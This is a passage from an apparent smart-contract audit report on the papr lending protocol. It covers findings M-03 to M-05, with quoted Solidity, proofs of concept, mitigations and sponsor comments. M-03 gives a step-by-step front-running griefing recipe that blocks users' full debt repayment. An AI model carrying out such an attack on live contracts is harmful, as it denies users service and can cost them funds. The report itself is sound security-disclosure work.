1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the project add checks to make sure when the collateral is disabled, the collateral should not be used to mint debt.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">isAllowed</span><span class=\"mtk1\">[</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">)]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk11\">InvalidCollateral</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/91#issuecomment-1370102552\">wilsoncusack (Backed) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Hmm, yeah this was known but the warden is probably right that it makes sense to stop minting more debt with these. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-grieving-attack-by-failing-users-transactions\" style=\"position:relative;\"><a href=\"#m-03-grieving-attack-by-failing-users-transactions\" aria-label=\"m 03 grieving attack by failing users transactions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/92\">[M-03] Grieving attack by failing user’s transactions</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/92\">HE1M</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/208\">HollaDieWaldfee</a></em></p>\n<p>An attacker can apply grieving attack by preventing users from interacting with some of the protocol functions. In other words whenever a user is going to reduce his debt, or buy and reduce his debt in one tx, it can be failed by the attacker.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In the following scenario, I am explaining how it is possible to fail user’s transaction to reduce their debt fully. Failing other transactions (buy and reduce the debt in one tx) can be done similarly.</p>\n<ul>\n<li>Suppose Alice (an honest user) has debt of 1000 <code>PaprToken</code> and she intends to repay her debt fully:</li>\n<li>\n<p>So, she calls the function <code>reduceDebt</code> with the following parameters:</p>\n<ul>\n<li><code>account</code>: Alice’s address</li>\n<li><code>asset</code>: The NFT which was used as collateral</li>\n<li><code>amount</code>: 1000 * 10**18 (decimal of <code>PaprToken</code> is 18).</li>\n</ul>\n</li>\n</ul>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function reduceDebt(address account, ERC721 asset, uint256 amount) external override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _reduceDebt({account: account, asset: asset, burnFrom: msg.sender, amount: amount});</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L148\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L148</a></p>\n<ul>\n<li>\n<p>Bob (a malicious user who owns a small amount of <code>PaprToken</code>) notices Alice’s transaction in the Mempool. So, Bob applies front-run attack and calls the function <code>reduceDebt</code> with the following parameters:</p>\n<ul>\n<li><code>account</code>: Alice’s address</li>\n<li><code>asset</code>: The NFT which was used as collateral</li>\n<li><code>amount</code>: 1</li>\n</ul>\n</li>\n<li>By doing so, Bob repays only <strong>1</strong> <code>PaprToken</code> on behalf of Alice, so Alice’s debt becomes <code>1000 * 10**18 - 1</code>.</li>\n</ul>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _reduceDebt(address account, ERC721 asset, address burnFrom, uint256 amount) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _reduceDebtWithoutBurn(account, asset, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        PaprToken(address(papr)).burn(burnFrom, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L481\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L481</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _reduceDebtWithoutBurn(address account, ERC721 asset, uint256 amount) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit ReduceDebt(account, asset, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486</a></p>\n<ul>\n<li>Then, when Alice’s transaction is going to be executed, it fails because of <code>Underflow Error</code>. Since Alice’s debt is <code>1000 * 10**18 - 1</code> while Alice’s transaction was going to repay <code>1000 * 10**18</code>.</li>\n</ul>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">_vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount);</span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L487\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L487</a></p>\n<ul>\n<li>Bob only pays a very small value of 1 <code>PaprToken</code> (consider that the decimal is 18) to apply this grieving attack.</li>\n<li>Bob can repeat this attack for Alice, if Alice is going to call this function again with correct parameter.</li>\n</ul>\n<p><strong><em>In summary, Bob could prevent the user from paying her debt fully by just repaying a very small amount of the user’s debt in advance and as a result causing underflow error. Bob can apply this attack for all other users who are going to repay their debt fully. Please note that if a user is going to repay her debt partially, the attack can be expensive and not financially reasonable, but in case of full repayment of debt, it is very cheap to apply this grieving attack.</em></strong></p>\n<p><strong><em>This attack can be applied on the transactions that are going to interact with the function <code>_reduceDebt</code>. The transactions interacting with this specific function are:</em></strong></p>\n<ul>\n<li><code>buyAndReduceDebt(...)</code></li>\n</ul>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L229\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L229</a></p>\n<ul>\n<li><code>reduceDebt(...)</code></li>\n</ul>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L149\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L149</a></p>\n<p><strong><em>It means that the attacker can prevent users from calling the functions above.</em></strong></p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The following condition should be added to the function <code>_reduceDebtWithoutBurn</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _reduceDebtWithoutBurn(address account, ERC721 asset, uint256 amount) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if(amount &gt; _vaultInfo[account][asset].debt){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            amount = _vaultInfo[account][asset].debt;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit ReduceDebt(account, asset, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/92\">wilsoncusack (Backed) confirmed</a></strong> </p>\n<hr>\n<h2 id=\"m-04-incorrect-usage-of-safetransferfrom-traps-fees-in-papr-controller\" style=\"position:relative;\"><a href=\"#m-04-incorrect-usage-of-safetransferfrom-traps-fees-in-papr-controller\" aria-label=\"m 04 incorrect usage of safetransferfrom traps fees in papr controller permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/110\">[M-04] Incorrect usage of safeTransferFrom traps fees in Papr Controller</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/110\">0xalpharush</a></em></p>\n<p>Because the Papr Controller never gives approval for ERC20 transfers, calls to <code>safeTransferFrom</code> on the Papr token will revert with insufficient approval. This will trap proceeds from auctions in the contract and prevent the owner/ DAO from collecting fees, motivating the rating of high severity. The root cause of this issue is misusing <code>safeTransferFrom</code> to transfer tokens directly out of the contract instead of using <code>transfer</code> directly. The contract will hold the token balance and thus does not need approval to transfer tokens, nor can it approve token transfers in the current implementation.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Comment out <a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/OwnerFunctions.ft.sol#L67\">this token approval</a> as the controller contract does not implement functionality to call approve. It doesn’t make sense to “prank” a contract account in this context because it deviates from the runtime behavior of the deployed contract. That is, it’s impossible for the Papr Controller to approve token transfers. Run <code>forge test -m testSendPaprFromAuctionFeesWorksIfOwner</code> and observe that it fails because of insufficient approvals. Replace <a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L383\">the call to <code>safeTransferFrom</code></a> with a call to <code>transfer(to, amount)</code> and rerun the test. It will now pass and correctly achieve the intended behavior.</p>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Call <code>transfer(to, amount)</code> instead of <code>safeTrasferFrom</code> <a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L383\">here</a>. Note, it’s unnecessary to use <code>safeTransfer</code> as the Papr token doesn’t behave irregularly.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/110#issuecomment-1369792773\">Jeiwan (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Good finding! In the current implementation <code>PaprController</code> doesn’t accumulate fees, so it may not cause a loss of funds.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/110\">wilsoncusack (Backed) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/110#issuecomment-1370856400\">trust1995 (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@wilsoncusack, will you agree that in the current iteration of the code, we can consider this a M level find as no funds are at risk?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/110#issuecomment-1370860635\">wilsoncusack (Backed) commented</a>:</strong></p>\n<blockquote>\n<p>@trust1995 it’s a tough call. No funds are at risk because we burn fees. So these functions are not needed or used right now. But if we did not burn fees then all papr fees would be stuck. In the whitepaper we mention the idea of an insurance fund. Tempted to say high? </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/110#issuecomment-1373759952\">trust1995 (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I have reviewed this finding along with several other judges, and believe it is ultimately of Med severity. Thank you for your input.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-paprcontrollerbuyandreducedebt-msgsender-can-lose-paper-by-paying-the-debt-twice\" style=\"position:relative;\"><a href=\"#m-05-paprcontrollerbuyandreducedebt-msgsender-can-lose-paper-by-paying-the-debt-twice\" aria-label=\"m 05 paprcontrollerbuyandreducedebt msgsender can lose paper by paying the debt twice permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/187\">[M-05] PaprController.buyAndReduceDebt: msg.sender can lose paper by paying the debt twice</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/187\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/275\">evan</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/220\">bin2chen</a>, and <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/112\">0x52</a></em></p>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232</a></p>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61</a></p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The <code>PaprController.buyAndReduceDebt</code> function (<a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232</a>) should work like this:</p>\n<ol>\n<li><code>msg.sender</code> swaps some amount of the underlying token for papr token</li>\n<li>This amount of papr token is used to repay debt for the address in the <code>account</code> parameter</li>\n</ol>\n<p><code>msg.sender</code> and <code>account</code> can be different addresses such that one can repay anyone’s debt.</p>\n<p>However there is a mistake in the function which leads to this behavior:</p>\n<ol>\n<li><code>msg.sender</code> swaps some amount of the underlying token for papr token</li>\n<li>The papr token is sent to the <code>account</code> address</li>\n<li>The papr token is burnt from the <code>msg.sender</code></li>\n<li>The amount of papr token burnt from the <code>msg.sender</code> is used to pay back the debt of the <code>account</code> address</li>\n</ol>\n<p>The issue is that the swapped papr token are sent to <code>account</code> but the papr token are burnt from <code>msg.sender</code>.</p>\n<p>In the best scenario when calling this function, the msg.sender does not have enough papr token to burn so the function call reverts.</p>\n<p>In the scenario that is worse, the <code>msg.sender</code> has enough papr token to be burnt.</p>\n<p>So the <code>account</code> address receives the swapped papr token and the debt of <code>account</code> is paid as well by the <code>msg.sender</code>.</p>\n<p>Thereby the <code>msg.sender</code> pays double the amount he wants to.</p>\n<p>Once by swapping his underlying tokens for papr.</p>\n<p>The second time because his papr token are burnt.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>PaprController.buyAndReduceDebt</code> function (<a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232</a>) calls <code>UniswapHelpers.swap</code> (<a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">UniswapHelpers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">swap</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">account</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">token0IsUnderlying</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minOut</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sqrtPriceLimitX96</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The second parameter which has the value <code>account</code> is the recipient of the swap.</p>\n<p>The last parameter which is <code>msg.sender</code> is the address paying the input amount for the swap.</p>\n<p>So the <code>msg.sender</code> pays some amount of underlying and the papr that the underlying is swapped for is sent to the <code>account</code>.</p>\n<p>But then the debt of <code>account</code> is reduced by burning papr token from <code>msg.sender</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_reduceDebt</span><span class=\"mtk1\">({</span><span class=\"mtk12\">account:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">asset:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralAsset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">burnFrom:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\">});</span></span></span></code></pre>\n<p>However the papr token from the swap were received by <code>account</code>. So the <code>msg.sender</code> pays twice and <code>account</code> receives twice.</p>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-8\" 